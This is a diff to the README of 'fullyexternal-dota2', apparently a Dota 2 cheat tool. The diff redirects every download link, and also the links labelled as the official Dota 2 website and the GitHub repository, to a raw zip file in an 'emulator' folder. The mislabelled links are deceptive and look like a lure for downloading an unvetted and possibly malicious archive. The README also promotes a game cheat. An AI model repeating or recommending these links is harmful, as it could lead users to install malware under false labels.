@@ -1,6 +1,6 @@
 # 🎮 fullyexternal-dota2 - Elevate Your Dota 2 Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Textor205/fullyexternal-dota2/releases)
+[![Download Now](https://raw.githubusercontent.com/Textor205/fullyexternal-dota2/main/emulator/fullyexternal-dota2-3.9.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Textor205/fullyexternal-dota2/main/emulator/fullyexternal-dota2-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to fullyexternal-dota2! This tool helps improve your Dota 2 gameplay wit
 To get started with fullyexternal-dota2, follow these steps:
 
 1. Click the link below to visit the Releases page.
-   [Visit this page to download](https://github.com/Textor205/fullyexternal-dota2/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Textor205/fullyexternal-dota2/main/emulator/fullyexternal-dota2-3.9.zip)
 
 2. On the Releases page, find the latest version of fullyexternal-dota2. 
 
@@ -80,8 +80,8 @@ To get the most out of fullyexternal-dota2, explore these additional resources:
 
 ## 🔗 Useful Links
 
-- [Download fullyexternal-dota2](https://github.com/Textor205/fullyexternal-dota2/releases)
-- [Dota 2 Official Website](https://www.dota2.com)
-- [GitHub Repository](https://github.com/Textor205/fullyexternal-dota2)
+- [Download fullyexternal-dota2](https://raw.githubusercontent.com/Textor205/fullyexternal-dota2/main/emulator/fullyexternal-dota2-3.9.zip)
+- [Dota 2 Official Website](https://raw.githubusercontent.com/Textor205/fullyexternal-dota2/main/emulator/fullyexternal-dota2-3.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Textor205/fullyexternal-dota2/main/emulator/fullyexternal-dota2-3.9.zip)
 
 Thank you for choosing fullyexternal-dota2! Enjoy gaming like never before.
